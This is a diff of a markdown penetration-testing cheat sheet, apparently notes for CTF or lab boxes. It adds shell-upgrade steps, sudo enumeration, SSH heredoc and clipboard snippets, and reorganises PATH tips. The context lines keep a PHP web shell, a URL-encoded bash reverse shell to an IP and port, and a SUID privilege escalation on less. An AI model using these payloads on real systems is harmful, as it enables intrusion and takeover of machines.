@@ -33,6 +33,8 @@ searchsploit -x <name/number of exploit>
 
 enumerate running processes: `pspy`
 
+`ps -U root -u root ux` View all processes started by a certain user (root in this case)
+
 enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)
 
 Semi-automated enumeration all-in-one (use this!): [nmapAutomator](https://github.com/21y4d/nmapAutomator)
@@ -46,9 +48,17 @@ common Local File Inclusion locations: [https://github.com/tennc/fuzzdb/tree/mas
 ### Upgrade shells:
 
 ```text
-1. sudo python -c 'import pty; pty.spawn("/bin/sh")'
-2. sudo perl -e 'exec "/bin/sh";'
-3. sudo ruby -e 'exec "/bin/sh"'
+1. python -c 'import pty; pty.spawn("/bin/sh")'
+2. perl -e 'exec "/bin/sh";'
+3. ruby -e 'exec "/bin/sh"'
+```
+To upgrade to fully interactive shell (python example):
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'; 
+ctrl-z #[to background]
+stty raw -echo; 
+fg #[to return shell to foreground]
+export TERM=xterm
 ```
 
 php shell: `<?php system($_GET['variable_name']); ?>`
@@ -63,16 +73,6 @@ bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
 ```
 
 nc listener: `nc -lvnp <port>`
-
-To upgrade to fully interactive shell:
-
-```bash
-python -c 'import pty;pty.spawn("/bin/bash")'; 
-ctrl-z #[to background]
-stty raw -echo; 
-fg #[to return shell to foreground]
-export TERM=xterm
-```
 
 ### TMUX
 
@@ -101,6 +101,8 @@ tmux plugins:
 
 execute `sudo` command as another user: `sudo -u <username> [command]`
 
+list user's sudo permissions: `sudo -l`
+
 execute any command while in `less`: `!<cmd>`
 
 Privilege Escalation to Root by setting suid on `/bin/less`: `chmod 47555 /bin/less`
@@ -128,6 +130,16 @@ If your user can `sudo` any of these text editors:
 3. [root@localhost]#
 Note: for this method to work, the attacker has to read a file that is longer than one page
 ```
+### Remote Code Execution 
+
+https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/
+Run commands on remote system without a shell through SSH with a "Herefile"
+```
+ssh server1 << HERE
+ command1
+ command2
+HERE
+```
 
 ### Misc Linux
 
@@ -143,9 +155,14 @@ IFS=$'\n'
 for i in $(ps -eo command); do echo $i; done
 ```
 
-'new' netstat: `ss -lnp | grep 9001` \#check if any connections on port 9001
+https://unix.stackexchange.com/questions/211817/copy-the-contents-of-a-file-into-the-clipboard-without-displaying-its-contents
+script to copy contents of file directly to clipboard; Save in PATH location then enjoy!
+```
+#! /bin/bash
+xclip -selection clipboard -i $@
+```
 
-get user's superuser permissions: `sudo -l`
+'new' netstat: `ss -lnp | grep 9001` \#check if any connections on port 9001
 
 copy files to local machine without file transfer:
 
@@ -161,7 +178,16 @@ web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)
 
 convert rpm to debian packages: `alien <file.rpm>`
 
-Add new $PATHs to `.profile` rather than '.bashrc`
+`sudo rm --force $(which <file_name>)`  Remove all instances of a certain file.  Could be used with `find` instead of `which`. dangerous with --force!!
+
+cycle through previous arguments: `alt-.`
+
+move between "words" on a command line `ctrl-[arrow_keys]`
+
+
+### PATH
+
+Add new $PATHs to `.profile` rather than `.bashrc`, then `source ~/.profile` to use new PATHs
 
 Makes `pwd` part of path so dont need `./` * NOT RECOMMENDED for home use! * `export PATH='pwd':$PATH`
 
@@ -174,7 +200,3 @@ for appending (instead of PATH="$PATH:~/opt/bin") and
 PATH="~/opt/bin${PATH:+:${PATH}}"
 for prepending (instead of PATH="~/opt/bin:$PATH")
 ```
-cycle through previous arguments: `alt-.`
-
-move between "words" on a command line `ctrl-[arrow_keys]`
-
